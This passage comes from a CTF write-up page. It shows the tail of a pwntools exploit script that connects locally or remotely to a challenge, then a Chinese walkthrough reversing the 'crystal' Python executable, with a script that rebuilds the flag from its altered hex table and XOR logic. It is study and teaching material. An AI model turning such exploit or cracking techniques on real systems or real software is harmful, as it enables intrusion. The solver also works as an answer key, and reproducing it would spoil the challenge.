class="line"><span class="string">		if(local == 1):</span></span><br><span class="line"><span class="string">			p = process(binary)</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			p = remote(ip,port)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>

<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="crystal"><a href="#crystal" class="headerlink" title="crystal"></a><strong>crystal</strong></h2><p>一个python写的exe程序</p>
<p>使用工具解包</p>
<p>反编译crystal.cp39-win_amd64.pyd</p>
<p>根据crystal找到sub_180005240，结合right！wrong字符串看函数的逻辑</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220620093157-kwndl8s.png" alt="image.png"></p>
<p>分析程序有一个hex编码功能的函数，，</p>
<p>是换了编码表的</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220620091226-4wznoyk.png" alt="image.png"></p>
<p>查看字符串，有三个比较可疑的数字，跟进发现有间接的赋值</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220620091527-hqxpdaa.png" alt="image.png"></p>
<p>继续跟进这些数字</p>
<p>找到后面的处理</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220620091931-xfw1p2u.png" alt="image.png"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220620091756-25qpeaz.png" alt="image.png"></p>
<p>然后向前分析，</p>
<p>输入32位长度的字符</p>
<p>然后对字符进行一个切片</p>
<p>前半部分赋值给qword_18000F910</p>
<p>经过一个异或调用前面功能函数进行解码得到一串数字</p>
<p>然后又有一顿操作</p>
<p>把我们输入的后半部分进行相同的操作</p>
<p>异或的值发生了变化</p>
<p>然后对处理的数值进行验证，满足条件之后就输出，right！</p>
<p>根据流程写出解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">hex_table = <span class="string">&#x27;8ed4bc0123a567f9&#x27;</span><span class="comment">#变异的hex编码表</span></span><br><span class="line">n628 = <span class="number">6282682509</span></span><br><span class="line">n452 = <span class="number">4524798713</span></span><br><span class="line">n883 = <span class="number">8835858143</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_encode</span>(<span class="params">n</span>):<span class="comment">#变异的hex编码</span></span><br><span class="line">	str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">while</span> n:</span><br><span class="line">		str1 += hex_table[n % <span class="number">16</span>]</span><br><span class="line">		n //= <span class="number">16</span></span><br><span class="line">	<span class="keyword">return</span> str1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_encode</span>(<span class="params">num0,num4</span>):</span><br><span class="line">	<span class="comment">#主逻辑</span></span><br><span class="line">	cry = <span class="number">0</span></span><br><span class="line">	a, b= <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num0, <span class="number">30</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">min</span>(i+<span class="number">30</span>, num0+<span class="number">1</span>)):</span><br><span class="line">			num1 = n628 * i**<span class="number">2</span></span><br><span class="line">			cry += num1</span><br><span class="line">			num2 = n452 * i</span><br><span class="line">			cry += num2</span><br><span class="line">			num3 = n883 + a</span><br><span class="line">			cry += num3</span><br><span class="line">		a, b = b, a+b</span><br><span class="line">	crycry = hex_encode(cry).encode()</span><br><span class="line">	byte_cry = <span class="built_in">bytearray</span>(crycry)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(byte_cry)):</span><br><span class="line">		byte_cry[i] ^= num4</span><br><span class="line">	text = byte_cry.decode()</span><br><span class="line">	<span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">flag = main_encode(<span class="number">1000</span>,<span class="number">7</span>)</span><br><span class="line">flag += main_encode(<span class="number">2000</span>,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220620093542-cwklhy5.png" alt="image.png"></p>
</div>
</article>

  </main>
  <aside>
    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>

  </aside>
  <footer role="contentinfo">
    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>

  </footer>
</body>
